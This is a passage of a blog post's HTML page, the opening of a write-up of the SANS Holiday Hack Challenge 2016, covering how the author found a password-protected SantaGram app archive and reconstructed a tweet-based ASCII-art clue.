<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/font-awesome.min.css">
  <link href="../../../../..//extras/style.css" rel="stylesheet">
  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />
<meta name="author" content="useless" />
<meta name="description" content="This blog is beginning to look a lot like being exclusively about SANS Christmas Challenges write-ups. What can I say, they're so good! Anyway, let's roll for the 2016 edition of this marvelous Christmas Challenge. Everything starts again with the Dosis children. As they're reminiscing on last ..." />
<meta name="keywords" content="">
<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
<meta property="og:title" content="SANS Christmas Challenge 2016"/>
<meta property="og:description" content="This blog is beginning to look a lot like being exclusively about SANS Christmas Challenges write-ups. What can I say, they're so good! Anyway, let's roll for the 2016 edition of this marvelous Christmas Challenge. Everything starts again with the Dosis children. As they're reminiscing on last ..."/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="../../../../../posts/2017/01/05/sans-christmas-challenge-2016/"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2017-01-05 00:00:00+01:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="../../../../../author/useless.html">
<meta property="article:section" content="Write-up"/>
<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; SANS Christmas Challenge 2016</title>
</head>
<body>
  <aside>
    <div>
      <a href="../../../../..">
        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
      </a>
      <h1><a href="../../../../..">All Your Base Are Belong To Me</a></h1>
      <p>You know, if that's alright with you</p>
      <nav>
        <ul class="list">
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="../../../../..">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
    </nav>

<article>
  <header>
    <h1 id="sans-christmas-challenge-2016">SANS Christmas Challenge 2016</h1>
    <p>Posted on jeu. 05 janvier 2017 in <a href="../../../../../category/write-up.html">Write-up</a></p>
  </header>
  <div>
    <img alt="sans_christmas_challenge_2016_logo.png" class="align-center" src="/images/sans-christmas-challenge-2016/sans_christmas_challenge_2016_logo.png" />
<p>This blog is beginning to look a lot like being exclusively about SANS Christmas
Challenges write-ups. What can I say, they're so good! Anyway, let's roll for
the <a class="reference external" href="https://holidayhackchallenge.com/2016/">2016 edition of this marvelous Christmas Challenge</a>.</p>
<p>Everything starts again with the Dosis children. As they're reminiscing on
<a class="reference external" href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/#sans-christmas-challenge-2015">last year's Christmas</a>,
they hear Santa Claus landing on their roof, getting down the chimney, and
starting leaving presents in their living room. Then, suddenly, they hear
fighting sounds from downstairs. When they get down, everything is destroyed,
as if people had been fighting. But no trace of Santa Claus, only a business
card, which we can find in <a class="reference external" href="https://quest2016.holidayhackchallenge.com/">the Dosis' living room</a>...</p>
<div class="section" id="part-1-a-most-curious-business-card">
<h2>Part 1: A Most Curious Business Card</h2>
<p>In the Dosis' living room, we find the business card of a certain Santa W.
Claus:</p>
<img alt="santa_business_card.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_business_card.png" />
<p>We now have Santa's <a class="reference external" href="https://twitter.com/santawclaus">Twitter</a> an
<a class="reference external" href="https://www.instagram.com/santawclaus/">Instagram</a>  accounts. We also see
that Santa has left his present bag behind. By going to it, we can see that
it's in fact a portal to the North Pole. Here, we can ask around for
information on Santa to his elves. We learn that they're running a bug bounty
program called SantaGram. To participate into this bug bounty program, we must
find the Android application.</p>
<p>By talking to Pepper Minstix, we get a <a class="reference external" href="https://www.northpolewonderland.com/dungeon.zip">link</a>
to a copy of the <a class="reference external" href="https://en.wikipedia.org/wiki/Dungeon_%28video_game%29">Dungeon</a>
video game. We now know what servers the elves are using to exchange files.
Let's see if we can find a copy of SantaGram on this server.</p>
<p>If we look back at Santa's <a class="reference external" href="https://www.instagram.com/santawclaus/">Instagram account</a>,
we can see a <a class="reference external" href="https://www.instagram.com/p/BNpA2kEBF85/">photo of one of the elves' desktop</a>.
If we zoom in, we can see that this elf was building a copy of the coveted
SantaGram Android application:</p>
<img alt="instagram_elf_desktop.jpg" class="align-center" src="/images/sans-christmas-challenge-2016/instagram_elf_desktop.jpg" />
<p>With the name of the ZIP archive on the screenshot, we can download the
SantaGram application at this <a class="reference external" href="https://www.northpolewonderland.com/SantaGram_v4.2.zip">URL</a>.</p>
<p>You can download the ZIP file <a class="reference external" href="/docs/sans-christmas-challenge-2016/SantaGram_v4.2.zip">here</a> (sha256: <code>51c3d144ffb25d06316bdd309a5e8a24cadb7592aace91036bd61f2f0c7440e5</code>).</p>
<p>Unfortunately, the archive is password protected:</p>
<div class="highlight"><pre><span class="nv">$ </span>unzip SantaGram_v4.2.zip
Archive:  SantaGram_v4.2.zip
<span class="o">[</span>SantaGram_v4.2.zip<span class="o">]</span> SantaGram_4.2.apk password:
</pre></div>
<p>Let's take a look at <a class="reference external" href="https://twitter.com/santawclaus">Santa's tweets</a>, to
see if we can find a clue:</p>
<img alt="santa_twitter.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_twitter.png" />
<p>Hmm, just a bunch of nonsense. Or is it? If we get the content of every tweet,
and paste them in a text file, we get the following string:</p>
<pre class="literal-block">
SANTAELFHOHOHOCHRISTMASSANTACHRISTMASPEACEONEARTHCHRISTMASELFSANTAELFHOHOHO
GOODWILLTOWARDSMENSANTAPEACEONEARTHHOHOHOJOYSANTAGOODWILLTOWARDSMENJOYJOYQQ
GOODWILLTOWARDSMENGOODWILLTOWARDSMENJOYHOHOHOJOYELFELFPEACEONEARTHJOYHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASCHRISTMASPEACEONEARTHNORTHPOLEHOHOHOELFELFQ
JOYNORTHPOLECHRISTMASPEACEONEARTHNORTHPOLEJOYGOODWILLTOWARDSMENELFCHRISTMAS
CHRISTMASGOODWILLTOWARDSMENELFHOHOHOCHRISTMASPEACEONEARTHPEACEONEARTHJOYELF
HOHOHOGOODWILLTOWARDSMENNORTHPOLEGOODWILLTOWARDSMENSANTAPEACEONEARTHELFELFQ
GOODWILLTOWARDSMENP???????????????????????????????4CHRISTMASJOYELFELFSANTAQ
NORTHPOLEHOHOHOELFf...............................]PEACEONEARTHHOHOHOSANTAQ
SANTASANTAJOYELFQQf...............................]PEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYf...............................]HOHOHOSANTAHOHOHOELFJOYQ
SANTASANTAJOYJOYQQf...............................]GOODWILLTOWARDSMENHOHOHO
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOSANTAQ
NORTHPOLECHRISTMASf...............................]PEACEONEARTHCHRISTMASJOY
PEACEONEARTHSANTAQf...............................]PEACEONEARTHNORTHPOLEELF
JOYCHRISTMASSANTAQf...............................]CHRISTMASHOHOHOCHRISTMAS
NORTHPOLEHOHOHOJOYf...............................]PEACEONEARTHPEACEONEARTH
SANTAELFELFJOYJOYQf.......aaaaaa/....._aaaaa......]PEACEONEARTHNORTHPOLEELF
GOODWILLTOWARDSMENf.......QQWQWQf.....]ELFWQ......]HOHOHOHOHOHOCHRISTMASJOY
NORTHPOLESANTAJOYQf.......HOHOHOf.....]JOYQQ......]CHRISTMASCHRISTMASHOHOHO
NORTHPOLEELFJOYJOYf.......SANTAQf.....]JOYQQ......]NORTHPOLEPEACEONEARTHELF
SANTAPEACEONEARTHQf.......HOHOHOf.....]SANTA......]PEACEONEARTHCHRISTMASELF
ELFSANTASANTAJOYQQf.......HOHOHOf.....]JOYQW......]CHRISTMASPEACEONEARTHJOY
JOYHOHOHONORTHPOLEf.......SANTAQ[.....)ELFQE......]PEACEONEARTHPEACEONEARTH
HOHOHOCHRISTMASJOYf.......$WJOYQ(......$WQQ(......]GOODWILLTOWARDSMENSANTAQ
JOYPEACEONEARTHELFf.......)JOYQ&#64;........??'.......]SANTAPEACEONEARTHHOHOHOQ
JOYJOYPEACEONEARTHL........?$QV'..................]CHRISTMASJOYNORTHPOLEJOY
SANTAJOYCHRISTMASQk...............................jGOODWILLTOWARDSMENJOYJOY
GOODWILLTOWARDSMENW...............................jJOYNORTHPOLEJOYELFSANTAQ
HOHOHOSANTAJOYELFQQ...............................GOODWILLTOWARDSMENHOHOHOQ
CHRISTMASSANTASANTA;................;............=JOYNORTHPOLEPEACEONEARTHQ
GOODWILLTOWARDSMENQL...............)L............jHOHOHOHOHOHOCHRISTMASELFQ
CHRISTMASHOHOHOELFQQ...............dQ,..........&lt;GOODWILLTOWARDSMENHOHOHOQQ
GOODWILLTOWARDSMENQQL.............&lt;QQm,........_HOHOHOHOHOHOCHRISTMASELFELF
SANTACHRISTMASELFELFQc..........._mJOYQc......aPEACEONEARTHCHRISTMASSANTAQQ
CHRISTMASPEACEONEARTHQw........._mSANTAWmwaawGOODWILLTOWARDSMENSANTAJOYELFQ
PEACEONEARTHELFSANTAELFQw,,..__yHOHOHOELFQWQQWGOODWILLTOWARDSMENHOHOHOSANTA
ELFHOHOHONORTHPOLEELFJOYWGOODWILLTOWARDSMENCHRISTMASSANTACHRISTMASJOYSANTAQ
ELFELFHOHOHOHOHOHOHOHOHONORTHPOLEJOYHOHOHOGOODWILLTOWARDSMENELFELFELFSANTAQ
ELFHOHOHOJOYPEACEONEARTHPEACEONEARTHJOYGOODWILLTOWARDSMENJOYELFPEACEONEARTH
GOODWILLTOWARDSMENJOYGOODWILLTOWARDSMENGOODWILLTOWARDSMENSANTAELFJOYJOYJOYQ
ELFSANTAPEACEONEARTHJOYJOYQQDT????????????????????4NORTHPOLEPEACEONEARTHELF
NORTHPOLENORTHPOLESANTAQWT^.......................]NORTHPOLEELFHOHOHOJOYELF
HOHOHOHOHOHOCHRISTMASQQP`.........................]JOYGOODWILLTOWARDSMENELF
ELFPEACEONEARTHSANTAQQ(...........................]HOHOHOSANTACHRISTMASJOYQ
JOYJOYCHRISTMASELFJOY(............................]GOODWILLTOWARDSMENHOHOHO
CHRISTMASELFELFELFQQf.............................]HOHOHONORTHPOLEJOYELFJOY
SANTACHRISTMASJOYQQD..............................]HOHOHOHOHOHOSANTASANTAQQ
HOHOHOELFSANTAELFQQ(..............................]GOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMENW...............................]NORTHPOLEHOHOHOHOHOHOJOY
CHRISTMASHOHOHOJOYF...............................]GOODWILLTOWARDSMENSANTAQ
CHRISTMASCHRISTMAS[.........._aaaaaaaaaaaaaaaaaaaajPEACEONEARTHELFNORTHPOLE
SANTANORTHPOLEELFQ(........jJOYQWQWWQWWQWWWWWWWWWGOODWILLTOWARDSMENHOHOHOQQ
ELFPEACEONEARTHELF;.......jWWSANTAGOODWILLTOWARDSMENSANTAGOODWILLTOWARDSMEN
ELFJOYNORTHPOLEJOY`.......QWGOODWILLTOWARDSMENGOODWILLTOWARDSMENCHRISTMASQQ
PEACEONEARTHJOYELF.......]WPEACEONEARTHCHRISTMASNORTHPOLEPEACEONEARTHHOHOHO
CHRISTMASJOYHOHOHO.......]HOHOHOELFGOODWILLTOWARDSMENPEACEONEARTHCHRISTMASQ
JOYCHRISTMASJOYELF.......]PEACEONEARTHCHRISTMASGOODWILLTOWARDSMENELFHOHOHOQ
JOYPEACEONEARTHJOY.......)WGOODWILLTOWARDSMENSANTANORTHPOLEJOYPEACEONEARTHQ
CHRISTMASHOHOHOELF........$WPEACEONEARTHNORTHPOLESANTAPEACEONEARTHSANTAJOYQ
JOYHOHOHOELFELFJOY;.......-QWCHRISTMASGOODWILLTOWARDSMENPEACEONEARTHJOYELFQ
HOHOHOCHRISTMASJOY(........-?$QWJOYCHRISTMASSANTACHRISTMASCHRISTMASHOHOHOQQ
ELFJOYELFCHRISTMASf...............................]PEACEONEARTHNORTHPOLEJOY
ELFHOHOHOSANTAELFQh...............................]GOODWILLTOWARDSMENHOHOHO
SANTACHRISTMASELFQQ,..............................]PEACEONEARTHPEACEONEARTH
GOODWILLTOWARDSMENQL..............................]HOHOHOELFCHRISTMASSANTAQ
GOODWILLTOWARDSMENQQ,.............................]PEACEONEARTHELFHOHOHOJOY
NORTHPOLESANTAHOHOHOm.............................]HOHOHOGOODWILLTOWARDSMEN
PEACEONEARTHCHRISTMASg............................]ELFHOHOHOSANTANORTHPOLEQ
NORTHPOLECHRISTMASJOYQm,..........................]NORTHPOLECHRISTMASSANTAQ
SANTASANTACHRISTMASSANTAw,........................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWQga,,....................]PEACEONEARTHPEACEONEARTH
PEACEONEARTHJOYCHRISTMASELFWCHRISTMASGOODWILLTOWARDSMENJOYPEACEONEARTHSANTA
PEACEONEARTHPEACEONEARTHCHRISTMASJOYSANTAPEACEONEARTHCHRISTMASELFHOHOHOELFQ
GOODWILLTOWARDSMENNORTHPOLECHRISTMASPEACEONEARTHHOHOHOELFJOYNORTHPOLEELFELF
JOYGOODWILLTOWARDSMENSANTACHRISTMASJOYPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOQ
HOHOHOCHRISTMASHOHOHOSANTANORTHPOLEPEACEONEARTHJOYPEACEONEARTHJOYJOYHOHOHOQ
JOYELFGOODWILLTOWARDSMENSANTAQBTT???TT$SANTASANTAPEACEONEARTHNORTHPOLEJOYQQ
SANTACHRISTMASCHRISTMASJOYWP&quot;`.........-&quot;9NORTHPOLEPEACEONEARTHCHRISTMASELF
SANTAELFELFELFSANTAJOYQQWP`...............-4JOYSANTANORTHPOLEJOYSANTASANTAQ
ELFELFELFHOHOHOHOHOHOQQ&#64;'...................&quot;$CHRISTMASELFSANTANORTHPOLEELF
ELFCHRISTMASSANTAELFQQP`.....................-$WELFWPEACEONEARTHSANTASANTAQ
SANTANORTHPOLEJOYELFQE........................-$SANTAELFWGOODWILLTOWARDSMEN
NORTHPOLEELFELFELFQQ&#64;`.........................-QWPEACEONEARTHPEACEONEARTHQ
PEACEONEARTHJOYJOYQQ(...........................]CHRISTMASHOHOHOELFSANTAJOY
HOHOHOCHRISTMASELFQP.............................$NORTHPOLEJOYQWJOYWJOYWELF
SANTACHRISTMASJOYQQ(.............................]WSANTAWPEACEONEARTHJOYELF
HOHOHOSANTAJOYELFQW............_aaaas,............QWCHRISTMASQWHOHOHOSANTAQ
SANTAPEACEONEARTHQf........._wELFWWWWQQw,.........3ELFHOHOHOJOYJOYSANTAELFQ
CHRISTMASSANTAELFQ[........&lt;HOHOHOELFELFQc........]CHRISTMASPEACEONEARTHELF
CHRISTMASCHRISTMAS(......._PEACEONEARTHJOY/.......)NORTHPOLESANTAELFQWELFWQ
PEACEONEARTHSANTAQ`.......dNORTHPOLEHOHOHOm.......:NORTHPOLEWCHRISTMASJOYQQ
PEACEONEARTHELFELF........SANTANORTHPOLEJOY;.......SANTASANTAJOYQWSANTAJOYQ
PEACEONEARTHSANTAQ.......]ELFSANTAJOYJOYELF[.......GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMEN.......]ELFNORTHPOLEJOYQQf.......ELFSANTAJOYHOHOHOQQWELFQ
GOODWILLTOWARDSMEN.......]ELF.......]JOYELF[.......PEACEONEARTHPEACEONEARTH
HOHOHOJOYNORTHPOLE.......]JOY.......]SANTAQ'.......SANTASANTAQQWNORTHPOLEQQ
CHRISTMASNORTHPOLE:......)WQQ.......]SANTAD........NORTHPOLESANTAELFWELFJOY
ELFCHRISTMASSANTAQ;......-JOY.......]ELFQW'.......:PEACEONEARTHCHRISTMASJOY
CHRISTMASSANTAELFQ[.......WQQ.......]ELFD'........=HOHOHOGOODWILLTOWARDSMEN
ELFELFSANTAJOYELFQL.......]QQ.......]ELF..........]PEACEONEARTHQWCHRISTMASQ
NORTHPOLESANTAELFQm.......+QQ.......]ELF;.........jWNORTHPOLENORTHPOLEELFWQ
JOYELFHOHOHOSANTAQQ.................]JOY[.........mCHRISTMASCHRISTMASQQWELF
NORTHPOLENORTHPOLEQ[................]JOYL........_PEACEONEARTHSANTASANTAELF
SANTANORTHPOLEJOYQQm................]ELFk........dHOHOHOPEACEONEARTHQQWJOYQ
PEACEONEARTHHOHOHOQQc...............]JOYm.......]PEACEONEARTHHOHOHOWHOHOHOQ
CHRISTMASHOHOHOJOYQQm...............]ELFQ......_GOODWILLTOWARDSMENNORTHPOLE
JOYELFNORTHPOLEJOYELFL..............]JOYQ;....&lt;SANTAHOHOHONORTHPOLEELFSANTA
PEACEONEARTHELFHOHOHOQ,.............]JOYQ[...wPEACEONEARTHELFSANTAWHOHOHOQQ
CHRISTMASELFELFELFJOYQ6.............]ELFQL_wPEACEONEARTHHOHOHOCHRISTMASELFQ
HOHOHOJOYNORTHPOLEQWELFwaaaaaaaaaaaajPEACEONEARTHGOODWILLTOWARDSMENSANTAQWQ
CHRISTMASELFPEACEONEARTHWWWQWWQWWWWELFELFSANTANORTHPOLESANTAELFQQWJOYHOHOHO
CHRISTMASNORTHPOLEHOHOHOHOHOHOCHRISTMASGOODWILLTOWARDSMENNORTHPOLEHOHOHOWQQ
GOODWILLTOWARDSMENNORTHPOLENORTHPOLESANTANORTHPOLEJOYSANTAELFELFWCHRISTMASQ
GOODWILLTOWARDSMENHOHOHOHOHOHONORTHPOLEELFSANTAELFNORTHPOLEPEACEONEARTHELFQ
PEACEONEARTHELFELFQWPEACEONEARTHPEACEONEARTHHOHOHOPEACEONEARTHWNORTHPOLEWQQ
ELFPEACEONEARTHCHRISTMASELFPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENSANTAQ
SANTASANTASANTAJOYELFJOYWGOODWILLTOWARDSMENPEACEONEARTHSANTAWPEACEONEARTHQQ
PEACEONEARTHSANTAJOYGOODWILLTOWARDSMENSANTACHRISTMASELFCHRISTMASELFJOYQWELF
CHRISTMASCHRISTMASELFELFHOHOHOWJOYWNORTHPOLESANTACHRISTMASWSANTAJOYQQWJOYQQ
ELFJOYSANTAJOYJOYQQWJOYWPEACEONEARTHNORTHPOLEHOHOHOHOHOHONORTHPOLEELFJOYELF
ELFNORTHPOLEJOYSANTANORTHPOLECHRISTMASQQWPEACEONEARTHJOYQWHOHOHOJOYWJOYELFQ
NORTHPOLECHRISTMASHOHOHOSANTAWPEACEONEARTHGOODWILLTOWARDSMENCHRISTMASHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASSANTAQQWELFHOHOHOSANTAQQWJOYSANTAQWSANTAJOY
JOYNORTHPOLEJOYPEACEONEARTHWELFELFQQWNORTHPOLEQWHOHOHONORTHPOLEELFELFHOHOHO
CHRISTMASSANTASANTAWJOYWCHRISTMASHOHOHONORTHPOLEJOYQQWHOHOHOSANTAWNORTHPOLE
PEACEONEARTHSANTASANTAPEACEONEARTHNORTHPOLEJOYJOYJOYELFCHRISTMASHOHOHOSANTA
SANTASANTACHRISTMASJOYJOYJOYELFJOYQWHOHOHOJOYQWPEACEONEARTHELFQQWCHRISTMASQ
GOODWILLTOWARDSMENELFPEACEONEARTHHOHOHOCHRISTMASELFQWHOHOHOWCHRISTMASHOHOHO
CHRISTMASELFELFPEACEONEARTHWELFQQWHOHOHOQQWCHRISTMASELFJOYNORTHPOLEHOHOHOQQ
SANTAPEACEONEARTHQQWJOYWCHRISTMASHOHOHOPEACEONEARTHGOODWILLTOWARDSMENJOYQWQ
JOYJOYHOHOHOELFELFP???????????????????????????????4SANTAQQWPEACEONEARTHELFQ
NORTHPOLENORTHPOLEf...............................]PEACEONEARTHQQWHOHOHOWQQ
CHRISTMASJOYHOHOHOf...............................]ELFGOODWILLTOWARDSMENELF
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOQQWELF
NORTHPOLEHOHOHOELFf...............................]CHRISTMASJOYQWSANTASANTA
SANTAJOYNORTHPOLEQf...............................]SANTAHOHOHOWJOYCHRISTMAS
GOODWILLTOWARDSMENf...............................]PEACEONEARTHHOHOHOQWJOYQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENHOHOHO
JOYCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENf...............................]NORTHPOLEPEACEONEARTHJOY
ELFSANTAHOHOHOELFQf.......aaaaaa/....._aaaaa......]GOODWILLTOWARDSMENWELFQQ
NORTHPOLEHOHOHOELFf.......QWWWWQf.....]QQWWQ......]HOHOHOHOHOHOQQWJOYSANTAQ
SANTANORTHPOLEJOYQf.......HOHOHOf.....]JOYQQ......]HOHOHOHOHOHONORTHPOLEELF
NORTHPOLEJOYJOYELFf.......JOYELFf.....]SANTA......]NORTHPOLEHOHOHONORTHPOLE
SANTASANTASANTAELFf.......JOYELFf.....]SANTA......]NORTHPOLENORTHPOLEELFELF
GOODWILLTOWARDSMENf.......JOYJOYf.....]JOYQW......]PEACEONEARTHHOHOHOQWELFQ
GOODWILLTOWARDSMENf.......HOHOHO[.....)JOYQE......]HOHOHOELFHOHOHOQQWJOYJOY
JOYNORTHPOLEELFELFf.......$WELFQ(......$WQQ(......]PEACEONEARTHNORTHPOLEELF
NORTHPOLEJOYELFJOYf.......)ELFQ&#64;........??'.......]CHRISTMASPEACEONEARTHJOY
SANTAPEACEONEARTHQL........?$QV'..................]HOHOHOGOODWILLTOWARDSMEN
JOYELFPEACEONEARTHk...............................jJOYSANTACHRISTMASWJOYJOY
SANTAPEACEONEARTHQW...............................jSANTAGOODWILLTOWARDSMENQ
CHRISTMASSANTAELFQQ...............................HOHOHOPEACEONEARTHSANTAQQ
ELFCHRISTMASELFELFQ;................;............=NORTHPOLENORTHPOLEJOYELFQ
NORTHPOLEJOYSANTAQQ[...............)L............jPEACEONEARTHJOYHOHOHOQQWQ
CHRISTMASHOHOHOJOYQm...............dQ,..........&lt;GOODWILLTOWARDSMENQWSANTAQ
SANTACHRISTMASSANTAQL.............&lt;QQm,........_JOYELFGOODWILLTOWARDSMENELF
HOHOHOSANTASANTAJOYQQc..........._mELFQc......aGOODWILLTOWARDSMENSANTAJOYWQ
CHRISTMASHOHOHOJOYJOYQw........._mELFQQWmwaawGOODWILLTOWARDSMENNORTHPOLEELF
NORTHPOLEELFPEACEONEARTHw,,..__yELFJOYJOYQWQWQWGOODWILLTOWARDSMENCHRISTMASQ
JOYNORTHPOLEELFNORTHPOLEWGOODWILLTOWARDSMENNORTHPOLEJOYJOYJOYSANTAQQWELFWQQ
JOYSANTAELFHOHOHOQQWNORTHPOLENORTHPOLEGOODWILLTOWARDSMENSANTASANTAHOHOHOJOY
ELFHOHOHOCHRISTMASCHRISTMASELFPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOELFJOYELF
JOYPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENHOHOHONORTHPOLEHOHOHOELFELFJOY
HOHOHOPEACEONEARTHELFJOYJOYQV?&quot;~....--&quot;?$CHRISTMASELFWPEACEONEARTHQWHOHOHOQ
CHRISTMASCHRISTMASJOYELFWW?`.............-?CHRISTMASHOHOHOQWELFWSANTAJOYWQQ
SANTAPEACEONEARTHQQWELFQP`.................-4HOHOHOWCHRISTMASNORTHPOLESANTA
CHRISTMASNORTHPOLEJOYQW(.....................)WGOODWILLTOWARDSMENNORTHPOLEQ
GOODWILLTOWARDSMENJOYW'.......................)WSANTAJOYQQWNORTHPOLEHOHOHOQ
JOYNORTHPOLEHOHOHOJOY(.........................)PEACEONEARTHSANTAELFWJOYWQQ
GOODWILLTOWARDSMENQQf...........................4PEACEONEARTHELFQWCHRISTMAS
NORTHPOLEHOHOHOELFQW`...........................-HOHOHOWCHRISTMASCHRISTMASQ
GOODWILLTOWARDSMENQf.............................]JOYJOYSANTAELFWCHRISTMASQ
HOHOHONORTHPOLEJOYQ`.............................-HOHOHOELFQWCHRISTMASSANTA
ELFELFELFJOYHOHOHOE.........._wwQWQQmga,..........$GOODWILLTOWARDSMENJOYWQQ
NORTHPOLECHRISTMASf........_yJOYWSANTAQQg,........]PEACEONEARTHPEACEONEARTH
SANTANORTHPOLEJOYQ[......._ELFELFSANTAELFQ,.......]CHRISTMASSANTASANTAWJOYQ
CHRISTMASCHRISTMAS;.......dPEACEONEARTHJOYk.......=JOYJOYHOHOHOQWJOYWHOHOHO
ELFNORTHPOLEELFELF......._HOHOHOCHRISTMASQQ,.......NORTHPOLEQWSANTASANTAELF
PEACEONEARTHJOYJOY.......]PEACEONEARTHJOYQQ[.......GOODWILLTOWARDSMENELFJOY
HOHOHOELFNORTHPOLE.......]PEACEONEARTHSANTAf.......NORTHPOLEHOHOHOHOHOHOELF
ELFSANTAELFHOHOHOQ.......]NORTHPOLEHOHOHOQQ[.......GOODWILLTOWARDSMENHOHOHO
CHRISTMASCHRISTMAS.......)PEACEONEARTHJOYQQ(.......HOHOHOHOHOHOSANTAWHOHOHO
SANTASANTAELFJOYQQ........HOHOHOCHRISTMASQ&#64;.......:NORTHPOLEELFQWSANTASANTA
CHRISTMASCHRISTMAS;.......]PEACEONEARTHELF[.......&lt;HOHOHOSANTANORTHPOLEQQWQ
HOHOHOPEACEONEARTH[........4HOHOHOJOYELFQf........]PEACEONEARTHHOHOHOHOHOHO
CHRISTMASCHRISTMASL.........&quot;HWJOYSANTAD^.........jNORTHPOLENORTHPOLEHOHOHO
GOODWILLTOWARDSMENm............&quot;!???!&quot;`...........NORTHPOLEHOHOHOWJOYQWELFQ
CHRISTMASJOYELFELFQ/.............................]WNORTHPOLECHRISTMASHOHOHO
SANTAJOYCHRISTMASQQk.............................dPEACEONEARTHELFELFHOHOHOQ
SANTAPEACEONEARTHJOY/...........................&lt;NORTHPOLECHRISTMASHOHOHOQQ
ELFSANTASANTASANTAQQm...........................mJOYELFSANTAPEACEONEARTHELF
CHRISTMASCHRISTMASELFk.........................jGOODWILLTOWARDSMENQWJOYWELF
ELFJOYCHRISTMASJOYJOYQL.......................jNORTHPOLENORTHPOLEJOYJOYJOYQ
ELFELFJOYSANTAJOYELFELFg,..................._yGOODWILLTOWARDSMENQQWSANTAELF
PEACEONEARTHJOYELFQWSANTAc.................aQWCHRISTMASHOHOHOSANTAJOYHOHOHO
SANTAJOYJOYPEACEONEARTHELFQa,..........._wQWWHOHOHOSANTAJOYELFQQWJOYSANTAQQ
HOHOHOELFJOYPEACEONEARTHQQWJOYmwwaaaawyJOYWCHRISTMASHOHOHOPEACEONEARTHJOYWQ
ELFCHRISTMASSANTASANTASANTAJOYQQWWWWQWGOODWILLTOWARDSMENJOYELFQWCHRISTMASQQ
SANTAHOHOHOELFPEACEONEARTHGOODWILLTOWARDSMENJOYPEACEONEARTHSANTASANTAJOYWQQ
HOHOHOJOYELFJOYELFQWGOODWILLTOWARDSMENPEACEONEARTHGOODWILLTOWARDSMENELFELFQ
NORTHPOLEJOYJOYELFHOHOHOWPEACEONEARTHNORTHPOLECHRISTMASHOHOHOQWELFJOYQQWJOY
GOODWILLTOWARDSMENSANTAJOYNORTHPOLENORTHPOLEHOHOHOHOHOHOGOODWILLTOWARDSMENQ
CHRISTMASJOYSANTANORTHPOLEV?&quot;-....................]GOODWILLTOWARDSMENQWJOYQ
GOODWILLTOWARDSMENSANTAW?`........................]GOODWILLTOWARDSMENSANTAQ
HOHOHOELFJOYJOYELFQWQQD'..........................]HOHOHONORTHPOLEQWHOHOHOQ
PEACEONEARTHHOHOHOJOYP`...........................]SANTAJOYELFWHOHOHOHOHOHO
PEACEONEARTHHOHOHOQQD`............................]JOYPEACEONEARTHSANTAELFQ
PEACEONEARTHHOHOHOQW'.............................]CHRISTMASJOYELFQWHOHOHOQ
ELFPEACEONEARTHELFQf..............................]PEACEONEARTHELFNORTHPOLE
SANTACHRISTMASJOYQQ`..............................]NORTHPOLEQQWNORTHPOLEQWQ
CHRISTMASHOHOHOELFE...............................]SANTAGOODWILLTOWARDSMENQ
GOODWILLTOWARDSMENf...............................]GOODWILLTOWARDSMENSANTAQ
ELFCHRISTMASELFJOY[.........amWNORTHPOLEGOODWILLTOWARDSMENJOYJOYJOYQWELFWQQ
PEACEONEARTHJOYJOY(......._QQWHOHOHOWJOYWPEACEONEARTHPEACEONEARTHNORTHPOLEQ
NORTHPOLEELFELFJOY`.......mSANTAQQWCHRISTMASQQWGOODWILLTOWARDSMENQQWHOHOHOQ
JOYSANTANORTHPOLEQ`......=CHRISTMASPEACEONEARTHSANTANORTHPOLENORTHPOLESANTA
NORTHPOLESANTAJOYQ.......]NORTHPOLEPEACEONEARTHELFHOHOHOGOODWILLTOWARDSMENQ
ELFNORTHPOLESANTAQ.......]GOODWILLTOWARDSMENQWELFJOYPEACEONEARTHCHRISTMASQQ
HOHOHONORTHPOLEJOY.......]GOODWILLTOWARDSMENJOYJOYQWPEACEONEARTHJOYWSANTAWQ
